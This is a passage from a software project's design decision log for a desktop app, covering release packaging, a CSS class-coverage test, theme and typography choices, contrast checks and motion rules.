  product has. A second place to look for the same fact is how one of them
  stops being read.
- **Studio cards** (`studio/*`). There is no studio surface. A card for a
  training job in a product that does not train would be decoration.
- **Streaming text** (`streaming/cursor`). Already adopted, Decision 32 - the
  block cursor is `.prose[data-streaming]::after`.

### Locked

`local-setup.test.ts` (14): a garbage tag listing is an empty inventory and
never a throw; a model listed with size 0 is DROPPED, because zero sorts to the
front of a list ranked by fit; the budget leaves the machine room; the best
installed model is the biggest that fits; when nothing fits NOTHING is offered;
the same machine gets the same answer twice; the ladder's last rung has no
floor; no size is claimed for a model that is not downloaded; each plan outcome
has a case that produces only it; every plan carries the reading it was made
from; the progress fold handles every line Ollama really sends, and never
estimates a byte count. `LocalSetupCard.test.tsx` (5): the reading is shown
beside the recommendation; "nothing fits" lists what is installed; Ollama is
linked and never installed; an unrecognised body costs one card and never the
pane; a half-built plan is as unrecognised as an empty one.


---

## Decision 39 - 0.1.1: the file tree on the compact rung, and a release that ships the whole package

**2026-09-19.** The owner walked the build and kept it: *"I'm pretty happy with
this copy. I like how it looks. I like the icons. I like the loading. I like
the characters. I like the board... I like the modes. I like the colors. It
seems easy enough to switch. Slash commands seem okay. Settings page just looks
pretty clear."* What was left was one UI note and one release.

### The file tree was on the wrong rung

> "For the files, have it just condensed a little bit smaller, because right now
> the files opens up the file directory very large."

`files.css` opens by stating law 3 - **"compact is the only density... airy is
a defect"** - and then, three lines later, puts tree rows on `--row-h`. That is
the sheet breaking its own law in its own header.

`--row-h` is 30px and sheet 10 assigns it to a folder, a rail item, a menu
item: CHROME, a fixed small set of things. `--row-h-tool` is 26px and the
sheet's own reason for it is that *"a tool call is 26px because it is a
footnote"*. A file tree is the densest list in this product - it mounts up to
three hundred rows, and a reader SCANS it rather than reading it.

Measured on this repository: 56 top-level rows, **224px given back, no row
lost** - about a third of the pane's height.

### One version, written once

`release.ts` spelled `0.1.0` by hand in six places and the CI gate spelled it a
seventh. Cutting a release meant finding all seven, and a release where one was
missed is a download button that 404s - which is the failure a reader cannot
tell from "the project is dead".

`VERSION` is a constant now and every filename is built from it, through one
`asset()` helper that also owns the one real quirk (GitHub rewrites spaces in
an asset name to dots in its URL, so the Windows file and its href differ by
two characters and neither is a typo). The gate RESOLVES the version out of the
file rather than matching literals, so it can no longer rot a release behind -
a gate that has to be edited for every release is a gate that teaches people to
edit gates.

### The release ships the whole package

The workflow collected `*.exe` and `*.dmg` only, so the portable zip and the
checksum manifest this repository learned to build in Decision 36 would never
have reached anybody. Now:

- **Windows** carries the installer AND the portable zip.
- **macOS** carries the dmg AND the app zip.
- **`SHASUMS256.txt` is generated in the RELEASE job**, over everything that
  actually arrived. `pnpm dist` writes one on each runner and two of those
  would collide on upload and disagree about what the release contains; one
  manifest generated centrally is the same set as the release by construction.
- The notes say what each artefact is for and what each OS will ask on first
  run, because a download that warns and does not explain itself reads as
  broken software.

**Mac is built on a Mac, and that is the whole reason the workflow exists:**
electron-builder does not cross-compile the mac target from Windows, and this
project is developed on Windows.

### Verified on the artefacts, not on the build tree

| check | result |
| --- | --- |
| `desktop-zip-smoke` | the 143 MB zip extracted to a directory it was never built in, ran, settled on `composer` |
| `desktop-smoke --packaged` | PASS |
| the INSTALLED copy | ran from `%LOCALAPPDATA%\Programs\Sequence`, PASS |
| what is inside it | asar + the analyzer server with **33 real de-symlinked node_modules** + the web dist |
| the binary's own label | `Sequence.exe` reports ProductVersion **0.1.1** |
| **a real grounded ask** | the SHIPPED server tree, pointed at `examples/makemore`, answered from the local model: **5,292 in / 272 out, coverage 2/2 edges, source "provider"** |

The last row is the one that matters. Every other check proves the app starts;
that one proves the package a person downloads reads a repository and answers
from it, with no key and no network, which is what CLAUDE.md's second
non-negotiable actually claims.

### One rule about authorship

Owner: *"we can launch a version 0.1.1 from my account, not from like
co-authored by anybody else, just from me. I don't want you co-authoring
anything."* Commits from 0.1.1 onward carry no `Co-Authored-By` trailer.


---

## Decision 40 - Six surfaces lost their stylesheets in one commit, and now a test says so

**2026-09-20.** The owner asked for a walk of my own: "see the overall gate,
walk through it on your own, fix anything that's open, check for real things,
make sure they're matching UI, make sure they're consistent."

So rather than look for things that offended me, I asked the one question that
had already caught two bugs this week, mechanically: **does every class a
component renders have a rule in any sheet this package loads?**

### The answer was 161 classes across nine files

And they had one cause. `fe6f644e` (2026-09-14, *"Ship V3 fill-screen chrome"*)
deleted **5,615 lines of CSS across sixteen sheets** and added 1,882 to
`v3.css`, leaving each emptied file a one-line note:

> `/* retired Decision 22 - V3 chrome owns visuals */`

**For four surfaces that note is TRUE.** `v3.css` really does carry the shell,
the sessions rail, the terminal and the browser; those selectors are in it and
they render. I checked, because I had started to write the opposite.

**For six it was not**, and no test noticed for six days:

| surface | classes with no rule | how it was found |
| --- | --- | --- |
| the AI Canvas block bodies | 8 rendered, 1 rule | by eye, 19 Sep (Decision 36) |
| Open a repository | 25 rendered, 0 rules | by eye, 20 Sep (the owner's screenshot) |
| the edit-approval card | 35 | **this audit** |
| the chart primitives + teach walk | 44 | **this audit** |
| the code card | 11 | **this audit** |
| the boot screen | 10 | **this audit** |

Two of the six reached the owner as *"looks bad"*, weeks apart. The other four
were still shipping. One commit judged one blast radius and applied it to
sixteen sheets.

**The edit-approval card is the one that should sting.** It is the accept/reject
diff - the thing Plan mode exists to produce - and it had been rendering
unstyled since 14 September. Its test file was one of the eighteen long-red
files in `packages/web2`, written off as v3-rebuild testids. Restoring the
sheet turned it **green**: 18 red files became 17, 119 failures became 114.
Some of that baseline was never a testid problem at all.

### The restores are reverts, not redesigns

Every deleted sheet was already written against the current token set - checked
before restoring, and `tools/ci/css-tokens-resolve.test.mjs` re-checks it - so
the rules went back as they were. Where a sheet had been partly rewritten
(charts, the AI Canvas) the merge is mechanical: **a deleted rule comes back
only when nothing in the package styles its rightmost class**, so nothing
restored can override the rewrite.

That filter's first cut used ANY class in the selector rather than the
rightmost, and recovered 14 of 43 - because almost every primitive is written
as `.seqchart .cbox` and `.seqchart` survived. The key class is what says who
owns a rule.

**Two classes were deliberately left dead.** `ai-canvas-export-quiet` styled a
control the owner had already removed, and `ai-canvas-md-codewrap` was renamed
in Decision 36 because it shadowed `ai-canvas-md-code`. Restoring either would
undo a decision rather than repair a loss.

**And one rule the filter dropped mattered.** `.seqchart { --ctone; --cseries }`
declares the two locals every chart primitive reads, and its key class had
survived, so the filter read it as already-owned. An undefined custom property
is dropped SILENTLY - `fill: var(--cseries)` simply does not apply - so every
arc, key swatch and heat cell would have painted black with nothing saying why.
The token gate caught it, which is that gate's whole argument in one line.

### One dead surface deleted

`app/BootSmoke.tsx` used to render the token ramp as a boot check. Its own header said
*"Wave 2 deletes this component when `<Shell/>` lands"*. Shell landed months
ago, nothing imports it, and its sheet was emptied with the rest. It is gone,
with `styles/boot.css` - 22 of the 161 were a surface that was supposed to have
been deleted already.

### What now stops it

`classCoverage.test.ts`: every class every component renders, against every
class every sheet declares, one global pool. It carries a **ceiling of 30**
(containers whose children are styled, and classes that exist to be queried) -
it may go down and may not go up. It also names the six restored surfaces
individually, because a ceiling alone would pass if somebody emptied a sheet
and styled thirty other things.

It cannot see an ugly screen; jsdom does no layout. It sees the thing that was
actually true in all six cases, which is a class with nothing behind it.

**161 → 30.**

### Also verified this walk

The one-click local setup was exercised end to end against a live engine rather
than a fixture: the plan read real hardware and a real Ollama inventory, the
POST wrote a profile (`ollama-deepseek-teach-latest`, no key, pointing at
127.0.0.1:11434), that profile answered a real turn, and the pull-state route
answered. The previous default profile was put back afterwards.

## Decision 41 - S4, the "Mix": Archivo, Bastion glass, blue in light, quiet motion

**2026-10-06.** The coordinator's rulings on the usebastion.io audit
(`lab/specs/bastion-audit.md`), standing until Jaden answers its three
questions (face, light accent, dark ground). Each of the three is one token or
one attribute, so the answer is a one-line change:

| question | the Mix (ships now) | "Match Bastion" | "Keep Sequence" |
| --- | --- | --- | --- |
| face | `--font-sans: "Archivo"` | same | `"Inter"` |
| light accent | `data-accent="blue"` (index.html default) | same | no attribute (gold) |
| dark ground | blue variant `--bg-base: #1D1D1C` | `#0b0d12` | same as Mix |

**Type.** Archivo, bundled in the app as one variable woff2
(`packages/web2/src/styles/fonts/archivo-latin-wght.woff2`, OFL, 26,752 bytes):
the latin subset the Bastion site already ships, instanced locally with
fontTools to the weight axis 350-450 and width 100. No network font; its bytes
are held by `tools/measure/style-ratchet.json`. The weight ladder is three real
weights and nothing else: display 350, body and labels 400, headings, buttons,
verdicts and board titles 450. **No 500, 600 or 700 anywhere**, and
`font-synthesis-weight: none` so a UA bold paints 450, never a smeared one.
Headings at `--t-17` and up track `--tr-head: -0.02em`.

**Glass controls** take the site's recipe in every theme: a fill of the page's
own ink at 4% (10% hovered), a rim at 16% (28% hovered), `blur(12px)
saturate(1.2)`, no inset highlight. The control rim leaves the hairline family
(`--edge` stays a hairline); chosen keeps a +.24 rim over resting. The pointer
light is a static radial on hover, CSS only. Panes over a static ground drop
their blur: glass is for small floating surfaces.

**This sheet changes** in two places: the face named in §1 and `--font-sans`
in §2. Nothing else in the book moves.

## Decision 42 - The owner chose "Match Bastion"

**2026-10-06.** Jaden answered the three questions Decision 41 left open with
**"Match Bastion"**. It replaces the Mix defaults:

| question | Match Bastion (ships) |
| --- | --- |
| face | Archivo, unchanged from Decision 41: 350 / 400 / 450, `--tr-head`, no 600 / 700 |
| accent | blue in light and dark: the Bastion lab's `#1f4fe0` light, `#6b91ff` dark (the solid stays `#1F55F1`) |
| dark ground | Bastion's blue-black `#0b0d12`, not the warm grey `#1D1D1C` |

**The room is the site's own**, read off its `lab.css` (lab/specs/bastion-audit.md),
not scaled from the grey: ground `#0b0d12`, the second ground `#151923` as the
first surface, ink `#eef1f6`, the second ink `rgba(226,232,245,.66)` (stored
composited over the ground, `#999ea8`, so every reader gets one opaque colour),
and Bastion's line `rgba(200,212,240,.13)`. Surfaces 2-4 step up from `#151923`
in Bastion's blue direction. The warm grey is kept as a value,
`data-ground="warm"`, not the default and not a code path.

**Checked by computed contrast** (`packages/web2/src/tokens/bastionContrast.test.ts`,
over the token values, both themes), and four values moved to pass:

- the muted ink is the second ink at .60, not .56: .56 read 4.36:1 on `--surface-3`;
- box borders got their own token, `--box-edge` (`rgba(200,212,240,.45)` dark,
  `rgba(19,19,21,.50)` light): Bastion's .13 line reads 1.3:1, and a card's
  outline is an object to find;
- the glass control rim is held to 3:1 (`.36` dark, `.48` light; Decision 41's
  16% read 1.6:1), chosen keeps its lead over rest and hover;
- added and changed box borders take the full verdict ink, and the removed ghost
  is dashed at full strength with quiet words rather than faded.

The blue variant now also carries the dark verdict, chart and diff cuts: it
paints the dark room whatever the OS asks for, and on an OS in light mode the
light `--spills` read 2.9:1 on a surface. The check caught it.

## Decision 43 - No live-label shimmer (supersedes Decision 7's shimmer)

Coordinator ruling on the S4 review, 2026-10-06. A running row shows braille
and nothing that sweeps across its label; a surface has at most one shimmer,
and a live-label shimmer could go only on the status strip's current label if
the Ramp Kit strip had one. It has none (read off usebastion.io/design: the
only running animation in its tool and status parts is the tool dot's ping),
so there is no live-label shimmer anywhere. The tool row, the reasoning fold,
the topology step and the status strip read their live label at the top ink;
the reasoning row's accent wash is still. Finite loading skeletons stay
(`.shimmer`, the AI canvas pending block): they are placeholders, not labels,
and there is one per surface. Locked in `chat/Transcript.test.tsx` ("a running
row has braille and no shimmer", "a surface has at most one shimmer", with a
planted control); infinite animations 12 -> 8 on the style ratchet. Braille on
every running row (file and search rows too) is markup and belongs to the chat
lane; today the reasoning row has it.

## Decision 44 - The dark room is a weight step lighter; chosen reads by ink

A computed-style walk over the running app (board and onboarding, both themes)
found no weight above 450 and synthesis already off: dark text looked heavier
because light ink on a dark ground spreads, not because a heavier cut was
asked for. The dark blocks ask one step lighter from the variable axis (body
and label 380, heading 430; display stays 350). Selected tabs, chips, the mode
label and the attach crumb read by ink, not weight. `font-synthesis-weight:
none` moved to `:root`, and the UA headings take the heading token. The style
ratchet counts CSS weight requests of 500 or more, at 0.

## Decision 45 - A floating surface over content is near-opaque

The palette, a menu, a popover and a toast sit over board text: they take a
near-opaque fill (`--float-fill`, the theme's `--surface-2` at 97%), no blur,
and keep their rim. Glass-thin fill is for controls over a static ground. The
palette was the one translucent surface (`--glass-fill-2`, 3-4%); the menus,
popovers and toasts were already opaque surfaces. `bastionContrast.test.ts`
holds palette row text at 4.5:1 on its fill composited over the board's
lightest label ink, with the old fill as the failing control.

## Decision 46 - Far zoom keeps the box

Two parts. **The box holds its far title**: on the far rungs (4-5) the
condensed title is counter-scaled to hold its screen size and may take two
lines, so a card there reserves the title at the board's largest far scale,
the smaller of the two-line title fit and 1/0.45 (board.css caps `--far-s` at
the same value); the layout key carries the near/far band, so ELK runs once
per crossing, never per zoom step; the first layout waits for the title face.
Below 45% the title shrinks with its card rather than outgrowing it. On
shopfront at 1024 the board now fits at a smaller zoom and titles paint at
9.7px, where they painted 14px over their borders before. **The box stays
visible**: two classes on the board root, `lod-far` below 0.5 and
`lod-farther` below 0.3, flipped only at crossings, raise the fill (ink about
10% over the kind's tone) and hold the rim at one device pixel or more to the
camera floor. No border width reads the per-frame zoom variable.
`board-legibility.mjs --max-title-past-box 0` counts titles whose ink leaves
its card on shopfront, monorepo-apps and codeforge, 1440 and 1024, both themes.

## Decision 47 - Body answer, ASCII ramp, onboarding rhythm

The chat answer is body text, body size at the body weight, as the Ramp Kit's
answer is (the prose cap is 110ch, the same ~958px measure); tool rows take
the message column's width, with the Thought fold and the status strip. The
empty-board and boot ASCII is a ramp, Bastion's " .,:-=+*#%@", dense at the
bottom edge and gone by mid-height, in the top ink at 6%, still; uniform dots
read as dust. Onboarding takes the Bastion rhythm: a 26px heading at 350,
tracked -0.03em, 24px to the agents row, 40px to the list, a 600px column and
13px rows. The board and the rails stay dense.

## Decision 48 - Every box reserves the two-line title

S4 review 4b. A row of boxes was uneven: at 56% Orders service was about 42px
beside 66px neighbours, because each card reserved only the lines its own name
took. A title takes at most two lines (titleFit.ts shortens a longer name in
the middle), so every card reserves two: `.nd-t` has a two-line min-height,
`cardHeight` counts two --lh-14 boxes (two at the far scale on rungs 4-5), the
floor is that card (66), and a one-line name sits centred. Uniform heights
with no coupling between neighbours and no second ELK pass. Locked on the
layout's own boxes (`canvas/farTitleBox.test.ts`, shopfront and the stress
board, near and far) and on the painted card in Chromium (`boardRendered`).
The type check for Decision 44 holds: the bundled Archivo is variable, its
`fvar` wght axis 350-450 (default 400) with `gvar`, and the `@font-face`
declares `font-weight: 350 450`, so 350, 380 and 430 paint as real instances.
JetBrains Mono ships static 400 and 500 cuts: mono asked for 380 paints 400,
and 430 or 450 paints the 500 cut.

## Decision 49 - The reskin: Jaden's mix (supersedes Decisions 42 to 48)

**2026-10-06.** Jaden picked a mix from three directions (A, the Sequence
home; B, uiarc.dev; C, Ramp Kit), relayed by the coordinator. His words: "the
ramp kit has the best coloring"; uiarc.dev is "very soft, very glass, very
straightforward", with "more transparency on top of their soft pill buttons";
"the pop-ups are very clean"; "I don't like the sidebar" (B's icon rail) but "I
like the session rail... worktrees, earlier, today"; "I like the bottom left
where it shows like the codex editing"; diffs "only when expanded"; and
"lovable graphite looks a little bit too much in certain places", so the
product moves away from Lovable graphite, light mode included. The build spec
is `lab/specs/reskin-mix.md`; its target file is `Mix.dc.html`.

It supersedes Decisions 42 to 48 as follows:

| decision | what changes |
| --- | --- |
| 41 (type), 42 (room), 44 (dark weights) | Inter is the face again with the pre-Bastion ladder (400 / 500 / 600, verdicts 700) on real static cuts; the dark room is Ramp Kit's warm charcoal (`#20201f`, surfaces `#272725` / `#2e2e2c` / `#373734`, ink `#ecebe8` / `#b8b7b2` / `#8e8d88`, accent `#5b9bff`); light is Ramp Kit / Bastion light (`#f3f4f6`, ink `#0b0c0e`), with the same blue family. The heading tracking and the dark weight step go with Archivo. |
| 42 (contrast floors) | kept, recomputed over the new tokens: text 4.5:1, box borders and marks 3:1. |
| 43 (no shimmer) | kept. |
| 45 (floating surfaces) | kept: menus, popovers and the palette are near-opaque; they take B's menu shape. |
| 46, 48 (far zoom, two-line title) | kept: cards reserve two title lines; the legibility counter stays green. |
| 47 (body answer, ASCII ramp, onboarding rhythm) | the body answer stays; the onboarding heading takes the heading weight. |

**Shape.** Soft and round everywhere, from radius tokens: pills for buttons,
tabs, segments and the board dock; rows, cards, panes, the composer and
dialogs on rising radii. **Glass** is kept only as transparency: controls are
thin glass pills; panes and anything large or scrolling never blur. **Icons**
are used to condense, centred in their box and against their label. **No "·"
separators** in UI text: thin dividers, gaps or icons, locked by a test that
scans the source.

**This sheet changes** in one place: §1 names Instrument Sans again (the face
before Decision 41) and `--font-sans` in §2 follows it. The app's face is
Inter, as it was before Decision 41.

## Decision 50 - Live-state indicators may shimmer and spin (supersedes Decision 43 for those only)

**2026-10-08.** Jaden, on the surface bar: "I like this kind of dot... where you
could basically just see if a section's live... maybe add an ASCII spinner,
like from OpenCode... add more highlighting and more of a shimmer effect on the
actual windows that are open... use coloring, dimming, shimmering to
differentiate." Decision 43 banned a sweep across a live label; this decision
supersedes that ban for two places only, and says where the sweep is.

**Where shimmer is applied (as built):**

- **Running session titles.** The session row's title carries `.shimmer-text`
  while the session works (`SessionPanel.tsx`), and loses it when it stops.
- **Running surface-bar labels.** A surface pill whose surface is running (the
  label is `.s2-seg-l` in `Shell2.tsx`) carries `.shimmer-text` for as long as
  it runs. Its braille spinner sits in the icon slot (`AsciiSpinner.tsx`).
- **Open pills, once.** A pill sweeps a soft band across its label when it
  opens (`.s2-sp.is-on`): two passes, then it rests.

`.shimmer-text` is defined once in `tokens/graphite.css`. It is the one looping
animation this decision adds, so the style ratchet's infinite-animation ceiling
moved 8 -> 9 (`tools/measure/style-ratchet.json`, dated 2026-10-08). It loops
only while the class is on a running label, and under `prefers-reduced-motion`
it is a still tint with no sweep.

**What stays quiet:** the transcript, the tool rows, the reasoning fold, the
topology step and the status strip read their live label at the top ink, with
no shimmer (Decision 43's clauses for those are unchanged). The spinner is
stepped by a timer that exists only while its surface works, so it adds no CSS
loop. Both are off under `prefers-reduced-motion` (the spinner holds one still
glyph).

**Pill states** are told apart by colour, outline and dimming, not by opacity:
closed is the ink-2 text step on the bar with no tint (4.5:1 or better in both
themes); open is tinted with its dot and carries the ink-1 label; focused is
outlined (the sliding indicator carries the outline).

## Decision 51 - Where a component comes from: our theme, then UIArc.dev, then shadcn

**2026-10-11.** Jaden, on the 0.1.6 review: "components are drawn from our
regular theme currently. New components and previous components can be also
drawn from UIArc.dev. For any type of UI that isn't in our system yet or might
be a different or new element, search shadcn component libraries first before
trying to create it on our own. This goes for icons and any other similar form
of art. Make sure this is a steady rule."

**The order, every time a surface needs a control, a menu, an icon or a piece
of art:**

1. **Our theme first.** The Graphite tokens and the kit that already ships
   (buttons, chips, segmented controls, menus, glass panels, the icon set).
   Reuse it as it is; never add a new button type.
2. **UIArc.dev next,** for a component the kit does not have yet, or to
   restyle one it has. It is adapted to the Graphite tokens, never pasted with
   its own colours or fonts.
3. **shadcn component libraries before inventing,** for any element that is in
   neither. Search them first; build our own only when nothing there fits, and
   then from the tokens.

Icons and other art follow the same order. Agent-drawn pictures in the chat
follow it too: the drawing frame carries the kit's own classes, and the
drawing prompt names them as the only style.

## Decision 52 - The app moves like a native product: press, lift, enter and exit, swipe

**2026-10-16.** Jaden: "make this like an iphone native product experience in
terms of ux usability of clicking and moving and swiping and so on - make sure
the website reflects this (our website is a good example of this)".

**The ruling, as built into the design system so every surface gets it:**

1. **A press eases.** Every kit control (`.s2-btn`, `.s2-ibtn`, `.sb-pill`,
   `.s2-chipbtn`) and anything marked `[data-press]` eases into a press at
   `--press-scale` (.97) over `--press-dur` (the first duration) and eases back
   out, instead of snapping. One shared rule in `tokens/graphite.css`; a new
   control joins by carrying the attribute.
2. **A hover lifts 1px** (Decision 17's lift) on pointers that can hover, and
   is released by the press.
3. **Overlays enter and exit.** Settings, Search, Help and the rest fade and
   settle in on `--ease-enter` and out on `--ease-exit` (`--dur-2` / `--dur-3`);
   closing keeps the overlay on the page as `data-state='closing'` for its exit.
4. **Swipe to close, on touch and narrow only.** A finger (or pen), or a window
   as narrow as the v3 breakpoint (720px), pulls an overlay's sheet down by its
   grabber; it follows the finger, closes past 64px or a quick flick, and
   springs back otherwise. A mouse on a desktop-width window sees no change.
   Escape and the scrim still close. The welcome track turns its page both ways
   on the same distance and flick.
5. **The shell does not rubber-band** (`overscroll-behavior: none` on the
   document; panels keep their own `contain`). Smooth scrolling is opt-in, for
   regions scrolled by code to a place the reader asked for, never for one that
   follows a stream.
6. **Reduced motion turns all of it into instant state changes**: no lift, no
   eased press, no enter or exit, no spring; the swipe still works.

This resolves migration-plan item R9 for the app: motion on direct
manipulation is permitted. The website follows it in its
own repository.
